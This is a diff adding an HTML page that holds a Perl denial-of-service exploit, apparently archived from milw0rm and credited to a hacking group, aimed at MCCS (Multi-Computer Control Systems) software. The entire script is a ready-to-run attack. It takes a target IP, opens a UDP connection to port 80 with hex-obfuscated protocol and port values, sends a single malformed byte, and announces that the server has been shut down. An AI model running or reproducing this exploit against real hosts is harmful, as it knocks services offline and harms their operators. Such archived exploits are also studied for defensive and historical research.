@@ -1,0 +1,45 @@
+<html>
+<head>
+<title>MCCS (Multi-Computer Control Systems) Command DoS Exploit</title>
+<pre>
+#!usr/bin/perl
+#
+# MCCS Server\Client Command DOS Exploit
+# --------------------------------------
+#  Infam0us Gr0up - Securiti Research
+#
+# Info: infamous.2hell.com
+# Vendor URL: www.xclusive-software.com
+#
+
+
+use IO::Socket;
+
+print(&quot;\n  MCCS Command DOS Exploit\n&quot;);
+print(&quot;-----------------------------\n&quot;);
+
+$str = &quot;\x41&quot;;
+if($#ARGV &lt; 0 | $#ARGV &gt; 1) {
+die &quot;usage: perl $0 [IP/host] \nExam: perl $0 127.0.0.1 \n&quot; };
+
+$adr = $ARGV[0];
+$prt = &quot;\x38\x30&quot;;
+
+print &quot;[+] Connect to host..\n&quot;;
+sleep 2;
+$remote = IO::Socket::INET-&gt;new(Proto=&gt;&quot;\x75\x64\x70&quot;, PeerAddr=&gt;$adr,
+PeerPort=&gt;$prt, Reuse=&gt;1) or die &quot;[-] Error: can't connect to $adr:$prt\n&quot;;
+print &quot;[+] Connected\n&quot;;
+$remote-&gt;autoflush(1);
+print &quot;[+] Sending bad string..\n&quot;;
+sleep 2;
+print $remote &quot;$str&quot; or die &quot;[-] Error: can't send string code\n&quot;;
+print &quot;[*] Client Server SHUTDOWNED!\n\n&quot;;
+print &quot;press any key to exit..\n&quot;;
+$bla= &lt;STDIN&gt;;
+close $remote;
+
+# milw0rm.com [2005-09-19]
+</pre>
+</html>
+
